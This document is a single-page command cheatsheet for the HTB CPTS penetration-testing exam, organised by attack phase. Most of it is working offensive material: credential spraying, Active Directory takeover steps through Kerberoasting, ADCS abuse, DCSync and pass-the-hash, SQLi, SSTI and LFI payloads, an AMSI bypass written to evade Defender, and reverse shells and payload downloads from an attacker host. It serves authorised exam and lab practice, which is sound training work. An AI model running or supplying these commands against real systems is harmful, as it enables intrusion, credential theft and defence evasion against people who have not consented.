# CPTS Exam Day — Single-Page Cheatsheet

> **Purpose:** Rapid command reference during the exam. For full context, see the linked methodology files.
> **Time plan:** Day 1–2 → Enumerate everything. Day 3–7 → Exploit + Escalate. Day 8–10 → Report.
> **Deep-dive references:** [enumeration-methodology.md](enumeration-methodology.md) · [linux-methodology.md](linux-methodology.md) · [windows-methodology.md](windows-methodology.md) · [active-directory-methodology.md](active-directory-methodology.md) · [bloodhound-guide.md](bloodhound-guide.md) · [web-methodology.md](web-methodology.md) · [tunneling-pivoting.md](tunneling-pivoting.md) · [password-cracking.md](password-cracking.md) · [file-transfers.md](file-transfers.md) · [shells-and-payloads.md](shells-and-payloads.md)

## Table of Contents

- [Phase 0: Host Discovery & Scanning](#-phase-0-host-discovery--scanning)
- [Phase 1: Service Enumeration (By Port)](#-phase-1-service-enumeration-by-port)
- [Phase 2: "I Have Creds" — Test Everything](#-phase-2-i-have-creds--test-everything)
- [Linux: Post-Foothold → Root](#-linux-post-foothold--root)
- [Windows: Post-Foothold → SYSTEM](#-windows-post-foothold--system)
- [Active Directory: Attack Chain](#-active-directory-attack-chain)
- [Web: Common Attack Quick-Ref](#-web-common-attack-quick-ref)
- [Pivoting (Quick Commands)](#-pivoting-quick-commands)
- [Hash Cracking (Quick Modes)](#-hash-cracking-quick-modes)
- [File Transfer (Quick Methods)](#-file-transfer-quick-methods)
- [Reverse Shells](#-reverse-shells)
- [Exam Time Management](#-exam-time-management)
- [Encoding Chain Decode (CTF / Layered Payloads)](#-encoding-chain-decode-ctf--layered-payloads)
- [Classical Cipher Decoding (CTF Artifacts)](#-classical-cipher-decoding-ctf-artifacts)

---

## 🔍 Phase 0: Host Discovery & Scanning

```bash
# Ping sweep
nmap -sn <SUBNET>/24

# Full TCP
nmap -p- --min-rate 5000 -Pn <IP> -oN allports.txt

# Service + scripts on open ports
nmap -p <PORTS> -sC -sV -Pn <IP> -oN detailed.txt

# Top 50 UDP
sudo nmap -sU --top-ports 50 --min-rate 2000 -Pn <IP>

# Add every hostname to /etc/hosts
echo '<IP>  <HOST>.<DOMAIN> <HOST>' | sudo tee -a /etc/hosts
```

---

## 🌐 Phase 1: Service Enumeration (By Port)

| Port | Quick Command |
|------|--------------|
| 21 | `ftp <IP>` (try `anonymous:anonymous@`) |
| 22 | `nc -nv <IP> 22` → banner → `ssh -o PreferredAuthentications=none user@<IP>` |
| 25 | `smtp-user-enum -M VRFY -U users.txt -t <IP>` |
| 53 | `dig axfr @<IP> <DOMAIN>` → `dig any <DOMAIN> @<IP>` |
| 80/443 | `whatweb <URL>` → `gobuster dir -u <URL> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak` |
| 88 | `kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt` → **AD environment** |
| 110/143 | `nc -nv <IP> 110` → `USER <USER>` → `PASS <PASS>` |
| 135 | `rpcclient -U "" -N <IP>` → `enumdomusers` → `querydispinfo` |
| 139/445 | `netexec smb <IP> --shares -u '' -p ''` → `netexec smb <IP> --rid-brute` |
| 161 | `snmpwalk -v2c -c public <IP> .1.3.6.1.2.1.25.4.2.1.2` (processes) |
| 389/636 | `ldapsearch -x -H ldap://<IP> -b "DC=<DOMAIN>,DC=<TLD>" -s sub "(objectClass=*)"` |
| 1433 | `netexec mssql <IP> -u '<USER>' -p '<PASSWORD>' -x 'whoami'` |
| 3306 | `mysql -h <IP> -u root -p` |
| 3389 | `xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD> /cert-ignore /dynamic-resolution` |
| 5432 | `psql -h <IP> -U postgres` |
| 5985 | `evil-winrm -i <IP> -u '<USER>' -p '<PASSWORD>'` |
| 6379 | `redis-cli -h <IP>` → `INFO` → `CONFIG GET *` |
| 10000 | `curl -k https://<IP>:10000/` → Webmin → `searchsploit webmin` |

### Vhost / Subdomain Discovery
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -H "Host: FUZZ.<DOMAIN>" -u http://<IP> -fs <SIZE>

gobuster vhost -u http://<DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

---

## 🔑 Phase 2: "I Have Creds" — Test Everything

```bash
# Spray against all services (replace subnet with specific IPs if needed)
netexec smb    <SUBNET>/24 -u '<USER>' -p '<PASSWORD>'
netexec winrm  <SUBNET>/24 -u '<USER>' -p '<PASSWORD>'
netexec rdp    <SUBNET>/24 -u '<USER>' -p '<PASSWORD>'
netexec mssql  <SUBNET>/24 -u '<USER>' -p '<PASSWORD>'
netexec ssh    <SUBNET>/24 -u '<USER>' -p '<PASSWORD>'

# Check shares with new creds
netexec smb <SUBNET>/24 -u '<USER>' -p '<PASSWORD>' --shares

# Look for (Pwn3d!) — means local admin on that host
# Check password policy before spraying more
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' --pass-pol
```

---

## 🐧 Linux: Post-Foothold → Root

```bash
# Stabilize shell first
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z then:
stty raw -echo; fg
export TERM=xterm && stty rows 40 cols 120

# === QUICK WINS (check in this order) ===
sudo -l                              # GTFOBins? LD_PRELOAD?
find / -perm -4000 -type f 2>/dev/null  # SUID → GTFOBins
getcap -r / 2>/dev/null              # cap_setuid? cap_dac_read_search?
cat /etc/crontab && ls -la /etc/cron* # writable cron scripts?
cat /etc/passwd                      # writable?
cat /etc/shadow 2>/dev/null          # readable = instant win

# === CREDS ===
cat /home/*/.bash_history /root/.bash_history 2>/dev/null | grep -i 'pass\|secret\|token'
grep -rli 'password\|passwd\|secret' /etc/ /opt/ /var/www/ 2>/dev/null | head -20
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
cat /var/www/html/wp-config.php /var/www/html/.env 2>/dev/null

# === NETWORK (pivot check) ===
ip a && ip route                     # dual-homed?
ss -tulnp                            # internal services on 127.0.0.1?

# === KERNEL CHECK ===
uname -r                             # check against exploit-suggester
ls -la /usr/bin/pkexec               # PwnKit (CVE-2021-4034)
sudo --version                       # Baron Samedit (CVE-2021-3156)
lsmod | grep -i 'esp\|rxrpc'         # Fragnesia/DirtyFrag (2026)
```

### Linux Privesc Decision Tree
```text
sudo -l shows entries?
  └→ YES: GTFOBins.github.io → shell escape or file read
  └→ NO: Continue ↓

SUID binary found?
  └→ Custom binary: strings/ltrace/strace it → path hijack or function exploit
  └→ Known binary: GTFOBins (filter: SUID)
  └→ NO: Continue ↓

Capabilities found? (cap_setuid, cap_dac_read_search)
  └→ YES: GTFOBins capability exploitation
  └→ NO: Continue ↓

Writable cron script?
  └→ YES: inject reverse shell → wait for execution
  └→ NO: Continue ↓

Kernel version old/unpatched?
  └→ YES: PwnKit / DirtyPipe / Fragnesia / DirtyFrag
  └→ NO: Continue ↓

NFS with no_root_squash?  /etc/passwd writable?  Docker socket?
  └→ Check all three
```

---

## 🪟 Windows: Post-Foothold → SYSTEM

```powershell
# === QUICK WINS ===
whoami /priv                          # SeImpersonate? → GodPotato
whoami /groups                        # Backup Operators? → SAM dump
net localgroup Administrators         # Already admin?
cmdkey /list                          # Stored creds? → runas /savecred

# === PRIVESC BY TOKEN ===
# SeImpersonatePrivilege → GodPotato/PrintSpoofer
.\GodPotato-NET4.exe -cmd "cmd /c C:\temp\nc.exe <IP> <PORT> -e cmd.exe"
.\PrintSpoofer64.exe -i -c powershell.exe

# === AMSI BYPASS (before any PS tool) ===
# Method 1 (string-split, evades signature on the literal field name):
$a='System.Management.Automation.A';$b='msiUtils';[Ref].Assembly.GetType("$a$b").GetField(('amsi'+'InitFailed'),'NonPublic,Static').SetValue($null,$true)
# If above fires Defender → kill PID, fresh `powershell -nop -ep bypass`, then byte-patch:
#   $b=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3); see windows-methodology.md Phase 4.10 Method 6
# Verify: amsiutils  (typing this string would normally trigger AMSI; no error = bypassed)

# === CREDS ===
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword"
Get-ChildItem C:\Users -Recurse -Include *.txt,*.xml,*.ini,*.config -ErrorAction SilentlyContinue | Select-String -Pattern "password" 2>$null
type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# === NETWORK (pivot check) ===
ipconfig /all                         # dual-homed?
netstat -ano | findstr "LISTENING"    # internal services?

# === HASH DUMP (as admin) ===
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
# Exfil → impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Windows Privesc Decision Tree
```text
whoami /priv shows SeImpersonate or SeAssignPrimaryToken?
  └→ YES: GodPotato / PrintSpoofer / JuicyPotatoNG → SYSTEM
  └→ NO: Continue ↓

SeBackupPrivilege?
  └→ YES: reg save SAM/SYSTEM or diskshadow → ntds.dit
  └→ NO: Continue ↓

SeDebugPrivilege?
  └→ YES: LSASS dump → extract creds
  └→ NO: Continue ↓

Unquoted service path or writable service binary?
  └→ YES: Replace binary → restart service → SYSTEM
  └→ NO: Continue ↓

AlwaysInstallElevated?
  └→ YES: msfvenom → .msi payload → msiexec → SYSTEM
  └→ NO: Continue ↓

Stored creds (cmdkey /list)?
  └→ YES: runas /savecred /user:<USER> cmd.exe
  └→ NO: Continue ↓

Domain-joined? → Shift to AD attack path
```

---

## 🏰 Active Directory: Attack Chain

```bash
# === STEP 1: Enumerate (pick a collector) ===
# Linux — Python (BloodHound CE schema):
bloodhound-ce-python -c All -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -ns <DC_IP> --zip
# Linux — Rust (faster, single static binary, NTLM hash auth supported):
rusthound-ce -d <DOMAIN> -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -i <DC_IP> -z   # CE schema
# Windows foothold — C# (avoids LDAP signing issues, sees host-local sessions):
.\SharpHound.exe -c All --ZipFilename bh.zip                                    # legacy (BH 4.x)
.\SharpHound.exe -c All --CollectAllProperties --ZipFilename bh.zip             # CE (BH 6.x / SpecterOps)
# Import → BloodHound → "Shortest Paths to Domain Admins"

# === STEP 2: Kerberoast ===
impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# === STEP 3: Check ADCS ===
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout
# ESC1 → certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA>' -template '<TPL>' -upn 'administrator@<DOMAIN>'
# Then: certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>

# === STEP 4: ACL Abuse (if BH shows path) ===
# GenericAll on user → force password change:
net rpc password '<TARGET_USER>' '<NEW_PASSWORD>' -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
# WriteDACL → grant yourself DCSync:
impacket-dacledit '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -target-dn 'DC=<DOMAIN>,DC=<TLD>' -action write -rights DCSync -principal '<USER>'

# === STEP 5: DCSync (endgame) ===
impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
# → ntlm hash of krbtgt + Administrator

# === STEP 6: Golden Ticket / Pass-the-Hash ===
impacket-psexec '<DOMAIN>/Administrator@<DC_IP>' -hashes ':<NT_HASH>'
```

### AD Quick Checks (Run All of These)
```bash
# AS-REP roast (no creds)
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat

# Password spray
netexec smb <DC_IP> -u users.txt -p 'Season2026!' --continue-on-success

# LLMNR/NBT-NS poisoning (if on LAN)
sudo responder -I tun0 -dwPv

# Delegation
impacket-findDelegation '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

# noPac
python3 noPac.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -shell
```

---

## 🌐 Web: Common Attack Quick-Ref

```bash
# SQLi
' OR 1=1-- -
" OR 1=1-- -
sqlmap -u "http://<IP>/page?id=1" --batch --dbs

# Command Injection
; id
| id
$(id)
`id`

# SSTI (detect)
{{7*7}}          # → 49 = Jinja2/Twig
{{7*'7'}}        # → 7777777 = Jinja2 | 49 = Twig

# SSTI (Jinja2 RCE)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# LFI
../../../etc/passwd
..%252f..%252f..%252fetc/passwd
php://filter/convert.base64-encode/resource=index.php

# File Upload bypass
shell.php → shell.php.jpg / shell.pHp / shell.php%00.jpg
# Content-Type: image/jpeg (but actual PHP content)

# SSRF
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/  # Cloud metadata
```

---

## 🔀 Pivoting (Quick Commands)

```bash
# SSH SOCKS proxy (most common)
ssh -D 1080 -f -N <USER>@<PIVOT>
# proxychains4 nmap/netexec/evil-winrm through it

# Chisel (when SSH unavailable)
# Attacker: chisel server -p 8000 --reverse
# Pivot:    chisel client <ATTACKER_IP>:8000 R:socks

# Ligolo-ng (modern — recommended). Full setup: tunneling-pivoting.md §Ligolo-ng
# Attacker: sudo ip tuntap add user $(whoami) mode tun ligolo
#           sudo ip link set ligolo up
#           ./proxy -selfcert -laddr 0.0.0.0:11601
# Pivot:    ./agent -connect <ATTACKER_IP>:11601 -ignore-cert
# In proxy: session  →  start  →  on attacker: sudo ip route add <INTERNAL_SUBNET>/24 dev ligolo

# Port forward with socat
socat TCP-LISTEN:<LOCAL_PORT>,fork TCP:<INTERNAL_IP>:<PORT>
```

---

## 🔑 Hash Cracking (Quick Modes)

| Hash Type | Hashcat Mode | Example |
|-----------|-------------|---------|
| NTLM | `-m 1000` | `aad3b435...` |
| NTLMv2 (netexec capture) | `-m 5600` | `USER::DOMAIN:...` |
| Kerberoast (TGS-REP) | `-m 13100` | `$krb5tgs$23$*...` |
| AS-REP roast | `-m 18200` | `$krb5asrep$23$...` |
| sha512crypt (/etc/shadow) | `-m 1800` | `$6$...` |
| sha256crypt | `-m 7400` | `$5$...` |
| md5crypt | `-m 500` | `$1$...` |
| bcrypt | `-m 3200` | `$2a$...` |
| MSSQL 2012+ | `-m 1731` | `0x0200...` |

```bash
hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## 📁 File Transfer (Quick Methods)

### To Target (Download)
```bash
# Linux target
curl http://<ATTACKER_IP>:<PORT>/<FILE> -o /tmp/<FILE>
wget http://<ATTACKER_IP>:<PORT>/<FILE> -O /tmp/<FILE>
# If no curl/wget: bash -c 'cat < /dev/tcp/<ATTACKER_IP>/<PORT> > /tmp/<FILE>'

# Windows target
certutil -urlcache -f http://<ATTACKER_IP>:<PORT>/<FILE> C:\temp\<FILE>
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>:<PORT>/<FILE>','C:\temp\<FILE>')"
curl.exe http://<ATTACKER_IP>:<PORT>/<FILE> -o C:\temp\<FILE>

# SMB (both)
# Attacker: impacket-smbserver share /path -smb2support
copy \\<ATTACKER_IP>\share\<FILE> C:\temp\<FILE>
```

### Attacker Server
```bash
python3 -m http.server <PORT>           # serve files
python3 -m uploadserver <PORT>          # receive uploads
impacket-smbserver share . -smb2support # SMB share
```

---

## 🔄 Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat (no -e)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > /tmp/f

# PowerShell
powershell -e <BASE64_ENCODED_PAYLOAD>
# Generate: https://www.revshells.com
```

---

## ⏰ Exam Time Management

```text
Day 1:  Full enumeration of ALL hosts. /etc/hosts entries. Screenshots.
Day 2:  Service-specific enum. BloodHound. Credential spraying. First footholds.
Day 3:  Exploit footholds. Privesc. Credential harvesting. Reuse creds.
Day 4:  AD attack chain. ADCS. Kerberoast. ACL abuse.
Day 5:  Pivot to internal networks. Second-tier hosts.
Day 6:  Domain compromise. DCSync. Golden ticket.
Day 7:  Mop up. Get all flags. Screenshots of everything.
Day 8:  Start report. Executive summary. Scope.
Day 9:  Technical findings. Remediation. Proof screenshots.
Day 10: Review. Export. Submit.
```

### If You're Stuck
```text
□ Re-enumerate ALL hosts (not just the one you're on)
□ Check UDP (SNMP 161 leaks users/processes)
□ Try vhosts: ffuf -H "Host: FUZZ.<DOMAIN>"
□ Re-read gobuster output — missed directory?
□ Default creds on every login panel
□ Re-run BloodHound with new creds — new edges
□ Check for ADCS: certipy-ad find -vulnerable
□ NFS: showmount -e <IP>
□ Internal services on 127.0.0.1 (port forward them out)
□ Password spray: Season2026!, Company123!, Welcome1
□ Have you tested EVERY credential against EVERY host?
```

---

## 🔣 Encoding Chain Decode (CTF / Layered Payloads)

> **Tip:** Identify by character set, decode one layer, re-check. Stop when `file` reports ASCII text or a known magic header.

```bash
# === IDENTIFY (by character set) ===
# 'Ook. Ook? Ook!' tokens          → Ook!
# '+-<>[].,'  only                  → Brainfuck
# A-Za-z0-9+/= with == padding      → base64
# All [0-9a-f], even length         → hex
# Long 'AAAA...' / '====' runs      → likely chained / re-encoded
```

```bash
# === SINGLE-SHOT DECODERS ===
echo '<BASE64>' | base64 -d                                         # base64 → bytes
echo '<HEX>'    | xxd -r -p                                         # hex    → bytes
echo '<B64>'    | python3 -c 'import sys,base64;sys.stdout.buffer.write(base64.b64decode(sys.stdin.read().strip()))'
echo '<HEX>'    | python3 -c 'import sys,binascii;sys.stdout.buffer.write(binascii.unhexlify(sys.stdin.read().strip()))'
```

```bash
# === CHAIN DECODER (output of stage N feeds stage N+1) ===
echo '<LAYER1>' | base64 -d | xxd -r -p | base64 -d                  # b64 → hex → b64
echo '<LAYER1>' | base64 -d | base64 -d | base64 -d                  # nested b64
# Inspect after each layer:
echo '<ENC>' | base64 -d > /tmp/stage1 && file /tmp/stage1 && xxd /tmp/stage1 | head
# Magic bytes: PK\x03\x04=zip, \x7fELF=ELF, \x1f\x8b=gzip, MZ=PE, %PDF=PDF
```

```python
# === BRAINFUCK INTERPRETER (paste-ready) ===
python3 -c "
code='<BF_CODE>'
tape=[0]*30000;p=0;i=0;out=''
while i<len(code):
 c=code[i]
 if c=='>':p+=1
 elif c=='<':p-=1
 elif c=='+':tape[p]=(tape[p]+1)%256
 elif c=='-':tape[p]=(tape[p]-1)%256
 elif c=='.':out+=chr(tape[p])
 elif c=='[' and tape[p]==0:
  d=1
  while d:
   i+=1
   if code[i]=='[':d+=1
   elif code[i]==']':d-=1
 elif c==']' and tape[p]!=0:
  d=1
  while d:
   i-=1
   if code[i]==']':d+=1
   elif code[i]=='[':d-=1
 i+=1
print(out)"
```

```text
# === Ook! → Brainfuck token map (translate then run BF) ===
Ook. Ook?  →  >
Ook? Ook.  →  <
Ook. Ook.  →  +
Ook! Ook!  →  -
Ook. Ook!  →  ,
Ook! Ook.  →  .
Ook! Ook?  →  [
Ook? Ook!  →  ]
```

```bash
# === Ook! → BF translator (sed) ===
echo '<OOK>' | sed -e 's/Ook\. Ook?/>/g' -e 's/Ook? Ook\./</g' \
                   -e 's/Ook\. Ook\./+/g' -e 's/Ook! Ook!/-/g' \
                   -e 's/Ook\. Ook!/,/g' -e 's/Ook! Ook\././g' \
                   -e 's/Ook! Ook?/[/g'  -e 's/Ook? Ook!/]/g' \
                   -e 's/[^+\-<>\.,\[\]]//g'
# → pipe result into the BF interpreter above
```

> **Tip:** When stuck, paste the blob into CyberChef → **Magic** (depth=4, intensive) — auto-detects layered base64/hex/rot/charcode chains. https://gchq.github.io/CyberChef

```bash
# === ALWAYS-CHECK loop after each decode ===
file /tmp/stageN          # 'ASCII text' = stop. 'data' / 'Zip archive' = keep going.
xxd /tmp/stageN | head    # confirm magic bytes
strings /tmp/stageN | head -20  # human-readable hints for next layer
```

---

## 🔐 Classical Cipher Decoding (CTF Artifacts)

> **When:** challenge boxes / hidden-message artifacts (forum posts, README blobs, image strings). Not core CPTS — present for HTB CTF-flavored boxes.

```bash
# === Step 1: Identify the cipher ===
# https://gchq.github.io/CyberChef/                 (Magic operation auto-detects)
# https://www.dcode.fr/cipher-identifier            (paste ciphertext, ranked guesses)

# Local heuristic — Index of Coincidence
# IC ~0.067 -> English plaintext or simple substitution
# IC ~0.038-0.045 -> polyalphabetic (Vigenere)
python3 -c "
import sys, collections
s = ''.join(c for c in sys.stdin.read().lower() if c.isalpha())
n = len(s); f = collections.Counter(s)
print(f'IC = {sum(v*(v-1) for v in f.values())/(n*(n-1)):.4f}')
" <<< '<CIPHERTEXT>'
```

### Caesar / ROT — brute-force all 25 shifts

```bash
# Print every candidate shift, eyeball for English
python3 -c "
ct = '<CIPHERTEXT>'
for s in range(1, 26):
    o = ''.join(chr((ord(c)-ord('a')-s)%26+ord('a')) if c.islower()
                else chr((ord(c)-ord('A')-s)%26+ord('A')) if c.isupper() else c for c in ct)
    print(f'{s:2d}: {o}')
"

# CyberChef one-click — ROT13 / ROT47 / ROT_n
# https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)
```

### Vigenere — unknown key (Kasiski + dictionary)

```bash
# https://www.guballa.de/vigenere-solver           (web — paste ciphertext)
# https://github.com/christianbender/vigenere-cipher

# CLI brute via cryptanalysis package
pip install cryptanalysis
python3 -c "
from cryptanalysis import vigenere
print(vigenere.cryptanalyze('<CIPHERTEXT>'))
"

# CyberChef decode with known key
# https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('<KEY>')&input=<CIPHERTEXT>
```

### Vigenere — known-plaintext key recovery

> **Pattern:** same author posts BOTH encrypted and cleartext versions (forum dump, chat + transcript). Recover key directly.

```python
# Both inputs lowercased, alpha-only, equal length
def recover_vig_key(ciphertext, plaintext):
    key = []
    for c, p in zip(ciphertext.lower(), plaintext.lower()):
        if c.isalpha() and p.isalpha():
            key.append(chr((ord(c) - ord(p)) % 26 + ord('a')))
    raw = ''.join(key)
    print(f'Raw key stream: {raw}')
    for klen in range(2, 16):
        if all(raw[i] == raw[i % klen] for i in range(len(raw))):
            print(f'Recovered key (length {klen}): {raw[:klen]}')
            return raw[:klen]
    return raw

recover_vig_key('<CIPHERTEXT>', '<KNOWN_PLAINTEXT>')
```

### General substitution cipher

```bash
# https://www.quipqiup.com                          (frequency-analysis solver, fast on English)
# CrypTool 2 — interactive substitution + cribs
```
